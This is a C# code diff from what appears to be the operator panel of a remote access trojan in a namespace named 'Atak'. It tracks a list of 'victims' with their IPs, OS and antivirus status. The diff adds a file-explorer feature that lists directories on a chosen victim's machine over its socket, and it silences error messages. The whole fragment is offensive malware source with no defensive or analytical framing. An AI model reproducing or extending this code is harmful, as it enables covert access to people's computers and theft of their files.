@@ -121,8 +121,19 @@ namespace Atak
                             ((Processes)(Application.OpenForms["Processes"])).listView1.Items.Add(item);
                         }
                         break;
-                    case "PPP":
-
+                    case "FILES":
+                        for (int i = 1; i < sData.Length; i++)
+                        {
+                            if (!sData[i].Contains(".") || sData[i].Contains("$"))
+                            {
+                                ((FileExplorer)(Application.OpenForms["FileExplorer"])).listBox1.Items.Add(sData[i]);
+                            }
+                            else
+                            {
+                                ((FileExplorer)(Application.OpenForms["FileExplorer"])).listBox2.Items.Add(sData[i]);
+                            }
+                            
+                        }
                         break;
                 }
 
@@ -130,7 +141,7 @@ namespace Atak
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message);
+                //MessageBox.Show(ex.Message);
             }
         }
         public delegate void _clientLogon(Socket _socket, string _id, string _machineName, string _ip, string _os, string _anti);
@@ -250,6 +261,7 @@ namespace Atak
             }
         }
 
+
         void connect(int port)
         {
             socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -261,6 +273,18 @@ namespace Atak
         {
             Regex re = new Regex("^(http|https)://");
             return re.IsMatch(url);
+        }
+
+        private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Victims victim in victimList)
+            {
+                if (victim.ip == VictimsListView.SelectedItems[0].Text)
+                {
+                    FileExplorer file = new FileExplorer(victim.socket);
+                    file.Show();
+                }
+            }
         }
     }
 }
